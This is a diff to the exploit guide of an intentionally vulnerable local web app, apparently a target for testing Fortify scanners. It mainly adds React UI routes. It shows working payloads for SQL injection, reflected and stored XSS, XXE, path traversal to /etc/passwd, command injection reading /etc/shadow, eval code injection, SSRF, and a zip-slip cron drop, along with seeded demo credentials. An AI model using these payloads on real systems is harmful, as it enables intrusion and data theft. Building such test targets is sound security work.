@@ -6,7 +6,7 @@
 
 ```bash
 npm install && npm run dev
-# App at http://localhost:8888
+# React UI at http://localhost:8888/app/
 # Seeded credentials: admin/Password123!, user1/Password123!
 ```
 
@@ -29,7 +29,7 @@ curl -H "Authorization: ******" \
   "http://localhost:8888/api/v3/users?keywords=%27+OR+%271%27%3D%271"
 
 # Admin user search also vulnerable
-# UI: http://localhost:8888/admin/users?keywords=' OR '1'='1
+# UI: http://localhost:8888/app/admin/users?keywords=' OR '1'='1
 ```
 
 **Expected:** All users returned instead of filtered results.
@@ -43,11 +43,15 @@ curl -H "Authorization: ******" \
 
 ```
 http://localhost:8888/products?keywords=<script>alert(document.cookie)</script>
+http://localhost:8888/app/products?keywords=<script>alert(document.cookie)</script>
 http://localhost:8888/products?raw=true&keywords=<script>alert(1)</script>
 http://localhost:8888/login?error=<script>alert(1)</script>
+http://localhost:8888/app/login?error=<script>alert(1)</script>
+http://localhost:8888/app/login-mfa?error=<script>alert(1)</script>
+http://localhost:8888/app/admin/users?keywords=<script>alert(1)</script>
 ```
 
-**Expected:** Alert dialog pops — payload reflected unescaped via `<%- keywords %>`.
+**Expected:** Alert dialog pops — payload reflected unescaped via `<%- keywords %>` on the legacy page and `dangerouslySetInnerHTML` on the React catalog, login, and MFA pages.
 
 ---
 
@@ -70,13 +74,14 @@ curl -X POST http://localhost:8888/api/v3/reviews \
   -d "{\"comment\":\"<script>alert('StoredXSS')</script>\",\"rating\":5,\"productId\":\"$PRODUCT_ID\"}"
 ```
 
-**Expected:** XSS fires when admin views reviews at `/admin/reviews` or product detail page.
+**Expected:** XSS fires when admin views reviews at `/admin/reviews`, the legacy product detail page, the React product detail page at `/app/products/$PRODUCT_ID`, or the React account review/message surfaces at `/app/user/reviews` and `/app/user/messages`.
 
 ---
 
 ## 4. XXE — XML External Entity Injection (CWE-611)
 
 **Endpoint:** `POST /user/upload-xml-file` (login as user1 first)  
+**React UI:** `http://localhost:8888/app/user/upload-xml-file`  
 **Fortify Tooling Detection:** SAST, DAST
 
 Create file `/tmp/xxe.xml`:
@@ -89,8 +94,8 @@ Create file `/tmp/xxe.xml`:
 ```
 
 ```bash
-# Login via browser at http://localhost:8888/login
-# Then upload the file at http://localhost:8888/user/upload-xml-file
+# Login via browser at http://localhost:8888/app/login
+# Then upload the file at http://localhost:8888/app/user/upload-xml-file
 ```
 
 **Expected:** Contents of `/etc/hosts` displayed in parsed output.
@@ -100,6 +105,7 @@ Create file `/tmp/xxe.xml`:
 ## 5. Path Traversal (CWE-22)
 
 **Endpoint:** `GET /user/files/download/unverified?file=../../etc/passwd`  
+**React UI:** `http://localhost:8888/app/user/download-file`  
 **Fortify Tooling Detection:** SAST, DAST
 
 ```
@@ -113,6 +119,7 @@ http://localhost:8888/user/files/download/unverified?file=../../../etc/passwd
 ## 6. OS Command Injection (CWE-78)
 
 **Endpoint:** `POST /admin/command-shell` or `POST /user/command-shell`  
+**React UI:** `http://localhost:8888/app/admin/command-shell` or `http://localhost:8888/app/user/command-shell`  
 **Fortify Tooling Detection:** SAST, DAST
 
 ```
@@ -128,6 +135,7 @@ cmd=ls /; cat /etc/shadow
 ## 7. Insecure Deserialization (CWE-502)
 
 **Endpoint:** `POST /user/import-settings`  
+**React UI:** `http://localhost:8888/app/user/import-settings`  
 **Fortify Tooling Detection:** SAST, DAST
 
 ```bash
@@ -154,6 +162,7 @@ curl -s -X POST http://localhost:8888/user/import-settings \
 ## 8. Log Injection (CWE-117)
 
 **Endpoint:** `POST /admin/log?val=<payload>`  
+**React UI:** `http://localhost:8888/app/admin/log` or `http://localhost:8888/app/user/log`  
 **Fortify Tooling Detection:** SAST
 
 ```
@@ -231,6 +240,7 @@ curl -X POST http://localhost:8888/user/edit-profile \
 ## 13. Code Injection via eval (CWE-95)
 
 **Endpoint:** `POST /admin/diagnostics` — field `expr`  
+**React UI:** `http://localhost:8888/app/admin/diagnostics`  
 **Fortify Tooling Detection:** SAST, DAST
 
 ```
@@ -245,6 +255,7 @@ expr=process.env
 ## 14. SSRF (CWE-918)
 
 **Endpoint:** `POST /admin/diagnostics` — field `url`  
+**React UI:** `http://localhost:8888/app/admin/diagnostics`  
 **Fortify Tooling Detection:** SAST, DAST
 
 ```
@@ -268,7 +279,7 @@ mkdir -p /tmp/zipslip
 echo '*/1 * * * * root echo pwned > /tmp/pwned.txt' > /tmp/zipslip/evil.txt
 cd /tmp && zip malicious.zip ../../etc/cron.d/evil.txt
 
-# Upload via http://localhost:8888/admin/backup
+# Upload via http://localhost:8888/app/admin/backup
 ```
 
 **Expected:** Files extracted to arbitrary paths outside `./data/restore/`.
